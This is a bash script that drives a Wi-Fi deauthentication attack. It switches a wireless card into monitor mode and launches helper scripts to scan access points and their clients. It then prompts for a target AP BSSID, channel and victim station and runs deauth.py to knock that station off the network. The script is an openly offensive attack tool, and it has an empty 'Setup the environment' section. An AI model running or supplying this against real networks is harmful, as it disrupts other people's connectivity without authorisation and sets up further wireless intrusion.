#!/bin/bash


#################
kill -9 `jobs -ps`
#################

iwconfig
echo -e "\n\nselect interface for the monitor mode" 
read interface
#interface=wlan0 

#enable monitor mode in network interface
ifconfig $interface down
iwconfig $interface mode monitor
ifconfig $interface up

 
### Wifi APs Scanner
xterm -e python3 wifi_scanner.py $interface &

echo -e "\nselect the BSSID of the target AP"
read AP_BSSID
#AP_BSSID=90:0a:1a:e0:2d:87
echo -e "\nenter the target channel "
read AP_CH
#AP_CH=9

echo -e "MAC = $AP_BSSID      Channel = $AP_CH"

### AP scan for victim
xterm -e python3 ap_scan.py $interface $AP_BSSID $AP_CH &

echo -e "\nenter the target station "
read TARGET
#TARGET=A4:50:46:0A:4D:AF



### Setup the environment





### Disconnect Devices from Wi-Fi 
echo -e "\n\nDisconnect the target "
python3 deauth.py -c 0 $AP_BSSID $TARGET -i wlan0 -v 


